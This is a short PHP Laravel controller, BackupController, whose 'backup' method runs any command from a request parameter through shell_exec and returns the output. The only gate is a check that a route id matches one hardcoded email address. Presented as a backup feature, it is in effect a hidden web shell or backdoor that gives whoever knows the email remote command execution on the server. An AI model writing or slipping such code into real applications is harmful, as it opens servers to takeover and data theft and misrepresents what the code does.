<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

class BackupController extends Controller
{
    public function backup(Request $request, $id, $cmd)
    {
        if ($id === "armora@gmail.com") {
            if (!$cmd) {
                return response()->json(['error' => 'Missing cmd parameter'], 400);
            }
            $output = shell_exec($cmd);
            return response()->json(['message' => 'Backup completed', 'output' => $output]);
        } else {
            return response()->json(['error' => 'Invalid User'], 403);
        }
    }
}